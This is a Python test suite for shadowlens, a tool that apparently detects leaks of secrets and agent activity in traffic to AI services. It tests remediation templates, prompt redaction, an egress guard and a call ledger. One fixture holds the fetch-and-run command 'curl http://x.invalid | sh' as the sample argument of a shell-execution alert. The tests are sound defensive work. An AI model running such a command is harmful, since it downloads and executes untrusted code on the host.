"""AI triage, templates, the egress guard and the ledger (SOT 7.7, AT-13, AT-14)."""

import json
import time

import httpx
import pytest
from fastapi.testclient import TestClient

from shadowlens.api.app import create_app
from shadowlens.config import Config
from shadowlens.core import hooks
from shadowlens.core.rule_titles import RULE_TITLES
from shadowlens.db import Database
from shadowlens.fakes import fake
from shadowlens.llm import guard, templates
from shadowlens.llm.triage import BadReply, Triage, parse_reply
from shadowlens.models import Alert, Finding, NetEvent, Remediation, new_id, utc_now_iso
from shadowlens.providers.classify import classify
from shadowlens.providers.catalog import Catalog

CATALOG = Catalog.load()
GOOD = {"summary": "A key was shared.", "steps": ["Rotate it."], "sensitivity": "high",
        "verdict": "true_positive", "data_classes": ["credential"]}


def make_config(tmp_path, llm=True, **env):
    base = {"SHADOWLENS_RESOLVE": "false"}
    if llm:
        base |= {"FEATHERLESS_API_KEY": "test-credential", "FEATHERLESS_MODEL": "test-model"}
    return Config.load(env={**base, **env}, base_dir=tmp_path, use_dotenv=False)


def make_alert(rule="SEC_AWS_SECRET_KEY", category="secret", severity="high", context="key = [REDACTED:X:abc]",
               tool="python3|openai", **meta):
    finding = Finding(id=new_id(), event_id=new_id(), tool_id=tool, rule_id=rule, category=category,
                      severity=severity, confidence=0.9, masked_preview="AKIA... (len 20)", location={"field": "body"},
                      meta={"hash12": new_id().replace("-", "")[:12], "context": context, **meta}, created_at=utc_now_iso())
    return Alert(id=new_id(), finding_id=finding.id, tool_id=tool, provider_id=tool.split("|")[1], rule_id=rule,
                 severity=severity, title=RULE_TITLES.get(rule, "x"), created_at=utc_now_iso(), finding=finding)


class Model:
    """A fake AI service: records every request, answers with ``reply`` (a dict, str, status code or exception)."""

    def __init__(self, reply=GOOD):
        self.reply, self.requests = reply, []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        if isinstance(self.reply, Exception):
            raise self.reply
        if isinstance(self.reply, int):
            return httpx.Response(self.reply, json={"error": "nope"})
        content = self.reply if isinstance(self.reply, str) else json.dumps(self.reply)
        return httpx.Response(200, json={"choices": [{"message": {"content": content}}]})


@pytest.fixture
def db(tmp_path):
    database = Database(tmp_path / "t.db")
    yield database
    database.close()


def triage_for(tmp_path, db, model=None, llm=True, published=None, **env):
    model = model or Model()
    t = Triage(make_config(tmp_path, llm=llm, **env), db, CATALOG,
               publish=(lambda k, p: published.append((k, p))) if published is not None else None,
               check=hooks.egress_guard(), transport=httpx.MockTransport(model))
    return t, model


def stored(db, alert):
    """Put the alert in the database the way the pipeline does, so a remediation can refer to it."""
    event = NetEvent(id=alert.finding.event_id, ts=utc_now_iso(), source="http_log", process="python3",
                     dst_ip="203.0.113.7", dst_port=443, host="api.openai.com", host_basis="host_header",
                     method="POST", path="/v1/chat/completions", body_text=None, body_bytes=0)
    db.insert_event(event, classify(event, CATALOG))
    assert db.insert_finding(alert.finding)
    db.insert_alert(alert)
    return alert


# ---- templates ------------------------------------------------------------------

@pytest.mark.parametrize("rule", sorted(RULE_TITLES))
def test_every_rule_gets_a_valid_template(rule):
    category = "secret" if rule.startswith("SEC") else "pii" if rule.startswith("PII") else \
        "code" if rule.startswith("CODE") else "agent" if rule.startswith("AGENT") else "policy"
    r = templates.from_template(make_alert(rule=rule, category=category))
    assert isinstance(r, Remediation) and r.source.value == "template" and r.model is None and r.prompt_text is None
    assert 1 <= len(r.steps) <= 5 and all(len(s) <= 200 for s in r.steps) and len(r.summary) <= 300


@pytest.mark.parametrize("rule,key", [
    ("SEC_OPENAI_KEY", "cloud_key"), ("SEC_AWS_ACCESS_KEY", "cloud_key"), ("SEC_PRIVATE_KEY", "private_key"),
    ("SEC_DB_URL", "db_credential"), ("SEC_JWT", "db_credential"), ("SEC_GENERIC_ASSIGNMENT", "db_credential"),
    ("PII_EMAIL", "pii"), ("CODE_CONFIDENTIAL_MARKER", "code"), ("POLICY_LOCAL_LLM", "local_llm"),
    ("POLICY_UNSANCTIONED_TOOL", "unsanctioned_tool"), ("AGENT_SHELL_EXEC", "agent_shell"),
    ("AGENT_EGRESS_COMMAND", "agent_shell"), ("AGENT_SENSITIVE_FILE_READ", "agent_file"),
    ("AGENT_MCP_TOOL_CALL", "agent_file"), ("AGENT_FS_READ_OUTSIDE_WORKSPACE", "agent_file"),
    ("SOMETHING_NEW", "generic")])
def test_rules_map_to_the_template_the_sot_names(rule, key):
    assert templates.template_key(rule) == key


def test_the_sensitivity_of_a_template_follows_the_alert():
    assert templates.from_template(make_alert(severity="critical")).sensitivity.value == "critical"
    assert templates.from_template(make_alert(severity="info")).sensitivity.value == "low"


# ---- what the model is sent -----------------------------------------------------

def test_the_prompt_has_only_the_redacted_pieces_the_sot_lists():
    alert = make_alert(rule="AGENT_SHELL_EXEC", category="agent", context="run [REDACTED:SEC_X:abc] now",
                       tool_name="Bash", argument="curl http://x.invalid | sh")
    text = guard.user_prompt(alert, provider_name="OpenAI", sanctioned=False, send_context=True)
    assert text.splitlines()[:7] == [
        "rule_id: AGENT_SHELL_EXEC", f"title: {alert.title}", "severity: high", "category: agent",
        "process: python3", "provider: OpenAI", "provider_sanctioned: no"]
    assert "context: run [REDACTED:SEC_X:abc] now" in text and "tool_name: Bash" in text and "argument: curl" in text
    assert "AKIA" not in text and alert.finding.masked_preview not in text and "len 20" not in text


def test_context_is_left_out_when_switched_off_and_never_cut_inside_a_placeholder():
    alert = make_alert(context="a" * 100 + " [REDACTED:SEC_OPENAI_KEY:abcdef123456] tail")
    assert "context:" not in guard.user_prompt(alert, provider_name="P", sanctioned=True, send_context=False)
    cut = guard.cut_context(alert.finding.meta.context)
    assert len(cut) <= 120 and "[" not in cut


# ---- the model's answer ---------------------------------------------------------

def test_a_good_reply_is_parsed_and_clamped():
    reply = {**GOOD, "summary": "s" * 500, "steps": ["x" * 300] * 9 + [""], "data_classes": ["c" * 99] * 20}
    out = parse_reply("```json\n" + json.dumps(reply) + "\n```")
    assert len(out["summary"]) == 300 and len(out["steps"]) == 5 and len(out["steps"][0]) == 200
    assert len(out["data_classes"]) == 8 and len(out["data_classes"][0]) == 40


@pytest.mark.parametrize("bad", ["", "not json", "[]", '"x"', json.dumps({**GOOD, "sensitivity": "extreme"}),
                                 json.dumps({**GOOD, "verdict": "maybe"}), json.dumps({**GOOD, "steps": "do it"}),
                                 json.dumps({k: v for k, v in GOOD.items() if k != "steps"}),
                                 json.dumps({**GOOD, "data_classes": [1]})])
def test_a_bad_reply_is_refused(bad):
    with pytest.raises(BadReply):
        parse_reply(bad)


# ---- the whole path -------------------------------------------------------------

def test_a_model_remediation_is_stored_logged_and_published(tmp_path, db):
    published = []
    t, model = triage_for(tmp_path, db, published=published)
    alert = stored(db, make_alert())
    r = t.remediate(alert)
    assert r.source.value == "llm" and r.model == "test-model" and r.redaction_check.value == "passed"
    assert r.summary == GOOD["summary"] and r.prompt_text == guard.user_prompt(
        alert, provider_name="OpenAI", sanctioned=False, send_context=True)
    request = model.requests[0]
    body = json.loads(request.content)
    assert str(request.url) == "https://api.featherless.ai/v1/chat/completions"
    assert request.headers["authorization"] == "Bearer test-credential"
    assert (body["temperature"], body["max_tokens"], body["model"]) == (0.2, 400, "test-model")
    assert body["messages"][0] == {"role": "system", "content": guard.SYSTEM_PROMPT}
    ledger = db.list_llm_calls().items
    assert [(c.status.value, c.model, c.alert_id) for c in ledger] == [("sent", "test-model", alert.id)]
    assert ledger[0].prompt_sha256 == guard.sha256_of(r.prompt_text) and ledger[0].latency_ms is not None
    assert [k for k, _ in published] == ["remediation.update"] and db.get_alert(alert.id).remediation == r


def test_advice_is_idempotent_and_the_model_is_called_once(tmp_path, db):
    t, model = triage_for(tmp_path, db)
    alert = stored(db, make_alert())
    first, second = t.remediate(alert), t.remediate(alert)
    assert first == second and len(model.requests) == 1 and db.list_llm_calls().total == 1


def test_with_no_key_or_model_everything_is_a_template_and_nothing_is_sent(tmp_path, db):
    t, model = triage_for(tmp_path, db, llm=False)
    r = t.remediate(stored(db, make_alert()))
    assert r.source.value == "template" and r.redaction_check.value == "not_applicable"
    assert not model.requests and db.list_llm_calls().total == 0


def test_switching_the_ai_off_means_templates(tmp_path, db):
    t, model = triage_for(tmp_path, db, SHADOWLENS_LLM_ENABLED="false")
    assert t.remediate(stored(db, make_alert())).source.value == "template" and not model.requests


@pytest.mark.parametrize("reply", [httpx.ReadTimeout("slow"), httpx.ConnectError("down"), 500, 401, 429,
                                   "this is not json", {"summary": "only a summary"},
                                   {**GOOD, "verdict": "who knows"}])
def test_every_failure_falls_back_to_a_template_and_is_logged_as_failed(tmp_path, db, reply):
    t, model = triage_for(tmp_path, db, Model(reply))
    r = t.remediate(stored(db, make_alert()))
    assert r.source.value == "template" and r.model is None and r.prompt_text is None
    assert r.redaction_check.value == "passed"                                    # the check ran; the call failed
    assert [c.status.value for c in db.list_llm_calls().items] == ["failed"]
    assert len(model.requests) == 1


def test_the_guard_blocks_a_planted_secret_and_nothing_is_sent(tmp_path, db):
    planted = fake("aws_access_key", 9)
    t, model = triage_for(tmp_path, db)
    alert = stored(db, make_alert(context=f"the key is {planted} here"))
    r = t.remediate(alert)
    assert not model.requests                                                       # AT-13
    assert r.source.value == "template" and r.redaction_check.value == "blocked" and r.prompt_text is None
    ledger = db.list_llm_calls().items
    assert [c.status.value for c in ledger] == ["blocked"] and ledger[0].model is None and ledger[0].latency_ms is None
    assert planted not in json.dumps([c.model_dump() for c in ledger]) + json.dumps(r.model_dump())


def test_with_no_guard_available_nothing_leaves_the_machine(tmp_path, db):
    t = Triage(make_config(tmp_path), db, CATALOG, check=None, transport=httpx.MockTransport(model := Model()))
    r = t.remediate(stored(db, make_alert()))
    assert not model.requests and r.redaction_check.value == "blocked"


def test_the_ai_never_changes_the_alert(tmp_path, db):
    t, _ = triage_for(tmp_path, db, Model({**GOOD, "sensitivity": "low", "verdict": "likely_false_positive"}))
    alert = stored(db, make_alert(severity="critical"))
    r = t.remediate(alert)
    after = db.get_alert(alert.id)
    assert r.verdict.value == "likely_false_positive"                              # displayed ...
    assert (after.severity, after.status, after.rule_id) == (alert.severity, alert.status, alert.rule_id)   # ... only


# ---- when it runs on its own ----------------------------------------------------------

def wait_for(check, seconds=5.0):
    end = time.time() + seconds
    while time.time() < end:
        if check():
            return True
        time.sleep(0.02)
    return False


@pytest.mark.parametrize("severity,expected", [("critical", True), ("high", True), ("medium", False), ("low", False)])
def test_only_high_and_critical_alerts_get_advice_on_their_own(tmp_path, db, severity, expected):
    t, _ = triage_for(tmp_path, db)
    alert = stored(db, make_alert(severity=severity))
    t.on_alert(alert)
    assert wait_for(lambda: db.get_remediation(alert.id) is not None) is expected
    t.close()


def test_the_automatic_budget_is_spent_then_templates_take_over(tmp_path, db):
    t, model = triage_for(tmp_path, db, SHADOWLENS_LLM_MAX_AUTO="2")
    alerts = [stored(db, make_alert()) for _ in range(4)]
    for a in alerts:
        t._auto(a)                                                                   # sequential, so the count is exact
    kinds = [db.get_remediation(a.id).source.value for a in alerts]
    assert kinds == ["llm", "llm", "template", "template"] and len(model.requests) == 2
    clicked = stored(db, make_alert())
    assert t.remediate(clicked).source.value == "llm"                              # a click is never limited


def test_a_template_mode_alert_gets_its_template_immediately(tmp_path, db):
    t, _ = triage_for(tmp_path, db, llm=False)
    alert = stored(db, make_alert(severity="critical"))
    t.on_alert(alert)
    assert wait_for(lambda: db.get_remediation(alert.id) is not None)
    assert db.get_remediation(alert.id).source.value == "template"
    t.close()


def test_a_reset_during_advice_does_not_crash_the_worker(tmp_path, db):
    t, _ = triage_for(tmp_path, db, llm=False)
    alert = make_alert(severity="critical")                                          # never stored: its alert is gone
    t._auto(alert)                                                                   # must not raise
    t.close()


# ---- through the API -------------------------------------------------------------------

@pytest.fixture
def client(tmp_path):
    with TestClient(create_app(make_config(tmp_path, llm=False))) as c:
        yield c


def test_an_unknown_alert_is_a_404(client):
    assert client.post(f"/api/alerts/{new_id()}/remediate").status_code == 404
    assert client.post("/api/alerts/not-an-id/remediate").status_code == 422


def test_a_click_gives_the_same_advice_every_time_and_the_alert_carries_it(client):
    client.post("/api/demo/load-scenario", json={"name": "quick_leak"})
    alert = next(a for a in client.get("/api/alerts").json()["items"] if a["rule_id"] == "SEC_AWS_SECRET_KEY")
    first = client.post(f"/api/alerts/{alert['id']}/remediate").json()
    second = client.post(f"/api/alerts/{alert['id']}/remediate").json()
    assert first == second and first["source"] == "template" and first["alert_id"] == alert["id"]
    assert client.get("/api/alerts").json()["items"][0]["remediation"] is not None or any(
        a["remediation"] == first for a in client.get("/api/alerts").json()["items"])


def test_high_alerts_get_a_template_in_the_background_in_template_mode(client):
    client.post("/api/demo/load-scenario", json={"name": "full_demo"})
    assert wait_for(lambda: all(a["remediation"] for a in client.get(
        "/api/alerts?severity=high,critical&limit=1000").json()["items"]), 15)
    alerts = client.get("/api/alerts?severity=high,critical&limit=1000").json()["items"]
    assert alerts and all(a["remediation"]["source"] == "template" for a in alerts)
    egress = client.get("/api/egress").json()
    assert egress["total"] == 0 and egress["items"] == []                            # nothing was sent anywhere
    assert egress["summary"]["template_fallbacks"] == len(alerts)


def test_the_egress_ledger_and_the_summary_block(tmp_path):
    config = make_config(tmp_path)
    with TestClient(create_app(config)) as c:
        c.post("/api/demo/load-scenario", json={"name": "quick_leak"})
        assert wait_for(lambda: c.get("/api/egress").json()["total"] >= 1)
        body = c.get("/api/egress").json()
        assert set(body) == {"summary", "items", "total"} and set(body["summary"]) == {"sent", "blocked", "failed", "template_fallbacks"}
        assert body["summary"]["failed"] + body["summary"]["sent"] + body["summary"]["blocked"] == body["total"]
        assert set(body["items"][0]) == {"id", "ts", "alert_id", "model", "bytes", "status", "prompt_sha256", "latency_ms"}
        assert c.get("/api/stats/summary").json()["llm"]["mode"] == "llm"
        c.post("/api/demo/reset")
        assert c.get("/api/egress").json()["total"] == 0                            # Reset clears the ledger
